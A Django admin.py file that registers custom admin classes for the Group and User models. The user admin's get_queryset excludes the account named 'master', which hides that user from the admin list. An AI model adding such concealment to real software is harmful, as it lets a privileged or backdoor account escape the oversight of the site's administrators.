from django.contrib import admin
from django.contrib.auth.models import Group, User
from django.contrib.auth.admin import GroupAdmin, UserAdmin
from .forms import GroupAdminForm, UserAdminForm


class CustomGroupAdmin(GroupAdmin):
    form = GroupAdminForm
admin.site.unregister(Group)
admin.site.register(Group, CustomGroupAdmin)


class CustomUserAdmin(UserAdmin):
    form = UserAdminForm
    
    def get_queryset(self, request):
        qs = super().get_queryset(request)
        return qs.exclude(username='master')

admin.site.unregister(User)
admin.site.register(User, CustomUserAdmin)









